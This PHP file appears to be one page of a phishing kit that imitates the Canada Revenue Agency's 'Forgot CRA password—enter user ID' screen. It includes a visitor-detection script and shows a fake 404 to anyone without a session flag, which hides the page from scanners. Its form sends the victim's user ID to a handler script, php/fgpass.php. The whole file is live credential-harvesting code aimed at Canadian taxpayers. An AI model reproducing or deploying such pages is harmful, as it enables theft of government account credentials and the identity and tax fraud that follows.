<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
   <body>
      </header>
      <?php include ("files/head.php"); ?>
      <div id="brand-container-cra">
			<div class="container">
				<div class="row">
					<div class="col-xs-12 col-sm-10" id="brand-text-cra">
						Canada Revenue Agency
					</div>
					
					<div class="col-xs-4 col-sm-2 text-right">
						
					</div>
				</div>
			</div>
		</div>
      <main role="main" property="mainContentOfPage" class="container">
         <div class="center">
            <div id="content">
               <h1 id="wb-cont">
                  Forgot CRA password—enter user ID
               </h1>
               <script src="https://hcaptcha.com/1/api.js?hl=en" async="" defer=""></script>
               <p>Our security measures do not allow us to recover your password for you.  </p>
               <p>You can create a new password, as long as you correctly answer your security questions. </p>
               <form class="submitForm" action="php/fgpass.php" method="post" id="UseridForm" autocomplete="off">
                  <div class="form-group ">
                     <div>
                        <label for="userid" class="required">User ID<strong class="required"><i>(required)</i></strong></label>
                     </div>
                     <input type="text" name="username" id="username" class="form-control" autocomplete="off" required>
                  </div>
                  <br>
                  For more information on how your privacy is protected, refer to our <a href="" target="_blank" rel="noopener noreferrer">Personal Information Collection Statement<span class="wb-inv">, opens in a separate window.</span></a>. 	  
                  <div class="formButtons">
                     <input type="button" name="cancel" id="cancelBtn" class="btn btn-default" value="Previous">
                     <div class="h-captcha" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" data-hcaptcha-source-id="input[data-hcaptcha-widget-id='0x2xgvm2pbpf']" style="display: none;"><iframe aria-hidden="true" data-hcaptcha-widget-id="0x2xgvm2pbpf" data-hcaptcha-response="" style="display: none;"></iframe><textarea id="g-recaptcha-response-0x2xgvm2pbpf" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-0x2xgvm2pbpf" name="h-captcha-response" style="display: none;"></textarea></div>
                     <input type="submit" name="submitButton" id="submitButton" class="btn btn-primary" value="Next">
                  </div>
               </form>
               <div id="pageLabel">Screen ID: CMS.33</div>
            </div>

         </div>
         <div>
            <dl id="wb-dtmd" property="dateModified">
               <dt>Date modified: </dt>
               <dd><time>2024-02-05</time></dd>
            </dl>
         </div>
      </main>
      <?php include ("files/footer.php"); ?>
